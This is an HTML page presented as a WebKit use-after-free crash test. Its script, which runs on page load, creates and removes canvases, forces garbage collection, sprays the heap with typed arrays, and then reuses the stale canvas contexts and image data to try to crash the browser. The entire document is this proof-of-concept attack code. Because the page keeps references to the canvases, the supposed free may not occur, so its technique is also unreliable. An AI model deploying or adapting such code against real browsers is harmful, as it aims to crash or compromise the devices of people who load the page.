<!DOCTYPE html>
<html>
<head>
  <title>WebKit UAF Crash Test</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; }
  </style>
</head>
<body>
  <h1>Testing WebKit UAF...</h1>
  <script>
    const canvases = [];
    const data = [];

    function allocCanvas(i) {
      const c = document.createElement("canvas");
      c.width = 256;
      c.height = 256;
      const ctx = c.getContext("2d");
      ctx.fillStyle = "red";
      ctx.fillRect(0, 0, 256, 256);
      canvases.push(c);
      data.push(ctx.getImageData(0, 0, 256, 256));
    }

    function sprayHeap() {
      let spray = [];
      for (let i = 0; i < 10000; i++) {
        spray.push(new Uint32Array(100));
      }
      return spray;
    }

    function triggerUAF() {
      let container = document.createElement("div");
      document.body.appendChild(container);

      for (let i = 0; i < 100; i++) {
        allocCanvas(i);
        container.appendChild(canvases[i]);
      }

      // Trigger GC
      for (let i = 0; i < 1000; i++) {
        new Array(1000).fill(i.toString());
      }

      // Remove canvases
      container.innerHTML = "";
      console.log("[+] Canvases removed");

      let spray = sprayHeap();

      // Try reuse imageData
      for (let i = 0; i < 100; i++) {
        try {
          let ctx = canvases[i].getContext("2d");
          ctx.putImageData(data[i], 0, 0);
        } catch (e) {
          console.log("[-] Exception:", e.message);
        }
      }

      console.log("[+] Done. If browser didn't crash, check logs.");
    }

    setTimeout(triggerUAF, 1000);
  </script>
</body>
</html>
